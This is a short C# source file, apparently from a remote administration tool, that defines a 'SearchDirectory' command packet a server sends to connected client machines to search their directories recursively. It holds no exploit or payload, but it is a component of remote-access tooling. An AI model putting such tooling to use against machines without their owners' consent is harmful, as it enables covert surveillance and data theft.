using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    public enum ActionType
    {
        Begin,
        Pause,
        Stop
    }

    public enum TimeoutType
    {
        Milliseconds,
        Seconds,
        Minutes
    }

    [Serializable]
    public class SearchDirectory : IPacket
    {
        public string BaseDirectory { get; set; }

        public bool Recursive { get; set; }

        public string SearchString { get; set; }

        public ActionType ActionType { get; set; }

        public TimeoutType TimeoutType { get; set; }

        public int Timeout { get; set; }
        
        public SearchDirectory()
        {
        }

        public SearchDirectory(string baseDirectory, bool recursive, string searchString, ActionType actionType,
            TimeoutType timeoutType = TimeoutType.Milliseconds, int timeout = -1)
        {
            this.BaseDirectory = baseDirectory;
            this.Recursive = recursive;
            this.SearchString = searchString;
            this.ActionType = actionType;
            this.TimeoutType = timeoutType;
            this.Timeout = timeout;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
